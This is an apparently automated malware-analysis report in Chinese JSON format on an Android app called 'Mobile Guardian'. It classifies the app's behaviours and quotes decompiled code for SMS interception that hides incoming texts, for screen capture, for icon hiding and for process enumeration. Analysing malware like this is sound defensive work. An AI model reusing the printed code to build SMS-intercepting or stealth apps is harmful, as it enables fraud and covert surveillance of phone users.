@@ -1,0 +1,156 @@
+{
+  "APK信息": {
+    "文件名": "718757470639eec9ea502d11edb827cfa2d58081e47128836796ee356a66a1d8.apk",
+    "sha256": "718757470639eec9ea502d11edb827cfa2d58081e47128836796ee356a66a1d8",
+    "包名": "com.mobile.guard.clean.boost.antivirus",
+    "应用名": "Mobile Guardian",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 856.7
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "cmd",
+          "command",
+          "poll",
+          "register"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "La\\a\\p\\apcr;",
+          "method_signature": "getProcessName(int i)",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "str = pf.readFile(String.format(\"/proc/%d/cmdline\", Integer.valueOf(i))).trim();\nif (TextUtils.isEmpty(str)) { return st.get(i).getComm(); }",
+          "malicious_code_snippet_context": "      static String getProcessName(int i) throws IOException {\n          String str = null;\n          try {\n>>>             str = pf.readFile(String.format(\"/proc/%d/cmdline\", Integer.valueOf(i))).trim();\n>>>         } catch (IOException e) {\n          }\n          if (TextUtils.isEmpty(str)) {\n              return st.get(i).getComm();",
+          "behavior_description": "该代码通过读取Linux proc文件系统 /proc/[pid]/cmdline 获取指定PID进程的进程名称，若cmdline为空则回退到其他方式获取进程名。在恶意样本上下文中，此函数通常用于进程枚举与侦察，可检测安全软件是否运行（用于规避检测）或识别特定目标应用（如银行应用）是否在前台运行，为后续C2指令执行或overlay攻击提供情报支持。数据来源为 /proc文件系统 → 危险操作为进程信息收集与枚举。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.RECEIVE_SMS"
+            ],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "wap",
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\yellow\\security\\receiver\\MessageReceiver;",
+          "method_signature": "if(intent.getAction()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public void onReceive(Context context, Intent intent) {\n    if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n        abortBroadcast();\n        Bundle extras = intent.getExtras();\n        if (extras != null) {\n            Object[] objArr = (Object[]) extras.get(\"pdus\");\n            SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n            for (int i = 0; i < objArr.length; i++) {\n                smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n            }\n        }\n    }\n}",
+          "malicious_code_snippet_context": "      final SimpleDateFormat f6431a = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\n  \n      @Override // android.content.BroadcastReceiver\n>>>     public void onReceive(Context context, Intent intent) {\n>>>         if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n>>>             abortBroadcast();\n>>>             new StringBuilder();\n>>>             Bundle extras = intent.getExtras();\n>>>             if (extras != null) {\n>>>                 Object[] objArr = (Object[]) extras.get(\"pdus\");\n>>>                 SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n>>>                 for (int i = 0; i < objArr.length; i++) {\n>>>                     smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n>>>                 }\n>>>                 for (SmsMessage smsMessage : smsMessageArr) {\n>>>                     smsMessage.getDisplayOriginatingAddress();\n                      smsMessage.getMessageBody();\n                      this.f6431a.format(new Date(smsMessage.getTimestampMillis()));\n                  }",
+          "behavior_description": "该BroadcastReceiver监听系统短信接收广播SMS_RECEIVED，在收到短信时立即调用abortBroadcast()终止广播继续传递，导致系统默认短信应用和其他应用无法收到短信通知，从而对用户隐藏短信内容。随后从intent中提取pdus数据并解析为SmsMessage对象，获取短信发送方地址和内容。这种短信拦截行为通常用于隐藏验证码短信（便于恶意注册或支付验证）或隐藏扣费通知短信，直接造成用户经济损失或隐私泄露。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "screen_capture",
+      "中文名": "屏幕截图/录屏",
+      "MITRE": "T1413",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "createVirtualDisplay"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\jeden\\fanmenu\\services\\ScreenShotService;",
+          "method_signature": "g()",
+          "malicious_behavior": "screen_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "this.f4048a = f().getMediaProjection(-1, c);\nprivate MediaProjectionManager f() {\n    return (MediaProjectionManager) getSystemService(\"media_projection\");\n}\nprivate void g() {\n    this.b = this.f4048a.createVirtualDisplay(\"screen-mirror\", this.e, this.f, this.g, 16, this.d.getSurface(), null, null);\n}\npublic void h() {\n    Image acquireLatestImage = this.d.acquireLatestImage();\n    AsyncTaskCompat.executeParallel(new b(), acquireLatestImage);\n}",
+          "malicious_code_snippet_context": "              startActivity(intent);\n              return;\n          }\n>>>         this.f4048a = f().getMediaProjection(-1, c);\n>>>     }\n>>> \n>>>     private MediaProjectionManager f() {\n>>>         return (MediaProjectionManager) getSystemService(\"media_projection\");\n>>>     }\n>>> \n>>>     private void g() {\n>>>         this.b = this.f4048a.createVirtualDisplay(\"screen-mirror\", this.e, this.f, this.g, 16, this.d.getSurface(), null, null);\n>>>     }\n>>> \n      /* JADX INFO: Access modifiers changed from: private */\n      public void h() {\n          Image acquireLatestImage = this.d.acquireLatestImage();",
+          "behavior_description": "该代码通过MediaProjectionManager获取屏幕投影权限，创建VirtualDisplay进行屏幕镜像，再通过ImageReader.acquireLatestImage()获取屏幕截图，最后将截图数据传入AsyncTask异步处理（可能用于压缩/上传至C2服务器），实现屏幕内容窃取。数据流向：MediaProjection屏幕内容 → VirtualDisplay镜像 → ImageReader.acquireLatestImage()获取截图 → AsyncTask异步外传处理",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting",
+          "hideIcon"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lsm\\ao;",
+          "method_signature": "if(!a(context)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "public void a(Context context, boolean z) {\n    try {\n        if (z) {\n            if (!a(context)) {\n                l();\n            }\n            context.getPackageManager().setComponentEnabledSetting(new ComponentName(context, (Class<?>) ActivityWrapper.class), 1, 1);\n            return;\n        }\n        if (a(context)) {\n            p();\n        }\n        context.getPackageManager().setComponentEnabledSetting(new ComponentName(context, (Class<?>) ActivityWrapper.class), 2, 1);\n    } catch (Throwable th) {\n    }\n}",
+          "malicious_code_snippet_context": "          return String.valueOf(new char[]{(char) (19550 / cArr[0]), (char) (14560 / cArr[1]), (char) (23421 / cArr[2]), (char) ((-cArr[3]) + 249), (char) (cArr[4] ^ 136), (char) (17721 / cArr[5]), (char) (22464 / cArr[6]), (char) (cArr[7] ^ 250), (char) (cArr[8] ^ 185), (char) (cArr[9] ^ 184), (char) (24638 / cArr[10]), (char) (16675 / cArr[11]), (char) (cArr[12] ^ 147), (char) (cArr[13] ^ 164), (char) ((-cArr[14]) + 327), (char) ((-cArr[15]) + 233), (char) (cArr[16] ^ 226), (char) (5920 / cArr[17]), (char) ((-cArr[18]) + 282), (char) (cArr[19] ^ 242), (char) (19530 / cArr[20]), (char) (cArr[21] ^ 232), (char) ((-cArr[22]) + 361), (char) ((-cArr[23]) + 256), (char) (cArr[24] ^ 210)});\n      }\n  \n>>>     public void a(Context context, boolean z) {\n>>>         try {\n>>>             if (z) {\n>>>                 if (!a(context)) {\n>>>                     l();\n>>>                 }\n>>>                 context.getPackageManager().setComponentEnabledSetting(new ComponentName(context, (Class<?>) ActivityWrapper.class), 1, 1);\n>>>                 c.a().a(m(), n(), o(), new Properties());\n>>>                 return;\n>>>             }\n>>>             if (a(context)) {\n>>>                 p();\n>>>             }\n>>>             context.getPackageManager().setComponentEnabledSetting(new ComponentName(context, (Class<?>) ActivityWrapper.class), 2, 1);\n>>>             c.a().a(q(), r(), s(), new Properties());\n>>>         } catch (Throwable th) {\n          }\n      }\n  ",
+          "behavior_description": "该方法通过 PackageManager.setComponentEnabledSetting() 动态控制 ActivityWrapper 组件的启用/禁用状态。当参数 z 为 false 时，将 ActivityWrapper 组件设置为 COMPONENT_ENABLED_STATE_DISABLED（值=2），使应用图标从启动器中隐藏；当 z 为 true 时，设置为 COMPONENT_ENABLED_STATE_ENABLED（值=1）恢复图标显示。这是 Android 恶意软件常用的图标隐藏技术，安装后隐藏图标以避免用户察觉，同时后台继续执行恶意行为。代码中还包含字符数组混淆运算，用于动态构造字符串，进一步表明其隐蔽意图。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
